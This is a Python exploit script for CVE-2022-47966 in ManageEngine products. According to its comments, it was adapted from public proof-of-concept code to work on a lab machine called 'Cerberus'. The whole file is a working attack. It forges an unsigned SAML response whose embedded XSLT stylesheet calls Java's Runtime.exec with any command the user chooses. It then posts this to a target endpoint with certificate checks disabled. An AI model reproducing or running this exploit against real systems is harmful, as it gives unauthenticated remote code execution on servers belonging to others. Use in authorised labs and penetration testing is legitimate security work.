# this code is minly from https://github.com/horizon3ai/CVE-2022-47966
# I've (lim8en1) changed the way SAML is generated according to https://packetstormsecurity.com/files/170925/ManageEngine-ADSelfService-Plus-Unauthenticated-SAML-Remote-Code-Execution.html
# This made this exploit work on Cerberus machine
# Beware that the successful expoit execution is not successful RCE, as if there are any errors in your command the script will tell you that the exploit was successfully executed

import datetime
import random
import string
import uuid

import urllib3
import base64
import requests
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def random_string(length: int = 8, charset: str = string.hexdigits) -> str:
    return ''.join(random.choices(charset, k=length))


assertion_id = str(uuid.uuid4())
variables = [random_string(5, string.ascii_letters) for i in range(5)]

saml = f"""<?xml version="1.0" encoding="UTF-8"?>
      <samlp:Response
        ID="_{str(uuid.uuid4())}"
        InResponseTo="_{random_string(32)}"
        IssueInstant="{datetime.datetime.now().isoformat()}" Version="2.0" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
        <samlp:Status>
          <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
        </samlp:Status>
        <Assertion ID="{assertion_id}"
          IssueInstant="{datetime.datetime.now().isoformat()}" Version="2.0" xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
          <Issuer>{{issuer}}</Issuer>
          <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
            <ds:SignedInfo>
              <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
              <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
              <ds:Reference URI="#{assertion_id}">
                <ds:Transforms>
                  <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                  <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
                    <xsl:stylesheet version="1.0"
                      xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
                      xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                      <xsl:template match="/">
                        <xsl:variable name="{variables[0]}" select="rt:getRuntime()"/>
                        <xsl:variable name="{variables[1]}" select="rt:exec(${variables[0]},'{{command}}')"/>
                        <xsl:variable name="{variables[2]}" select="ob:toString(${variables[1]})"/>
                        <xsl:value-of select="${variables[2]}"/>
                      </xsl:template>
                    </xsl:stylesheet>
                  </ds:Transform>
                </ds:Transforms>
                <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
                <ds:DigestValue>{base64.b64encode(random_string(32).encode()).decode()}</ds:DigestValue>
              </ds:Reference>
            </ds:SignedInfo>
            <ds:SignatureValue>{base64.b64encode(random_string(256).encode()).decode()}</ds:SignatureValue>
            <ds:KeyInfo/>
          </ds:Signature>
        </Assertion>
      </samlp:Response>
"""



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ManageEngine CVE-2022-47966')
    parser.add_argument('--url', type=str, required=True, help='Target SAML endpoint')
    parser.add_argument('--command', type=str, required=True, help="Argument to Java's Runtime.exec method")
    parser.add_argument('--issuer', type=str, required=True, help="Issuer for SAML assertion")
    parser.add_argument('--relay-state', type=str, required=True, help="Relay state value from the request in base64")
    args = parser.parse_args()

    url = args.url
    command = args.command
    issuer = args.issuer

    response = requests.post(
        url,
        data={
            'SAMLResponse': base64.b64encode(saml.format(command=command, issuer=issuer).encode()),
            "RelayState": args.relay_state
        },
        verify=False)
    if response.ok:
        print("Successfully exploited the target")
    else:
        print("Warning: probably parameters are wrong")

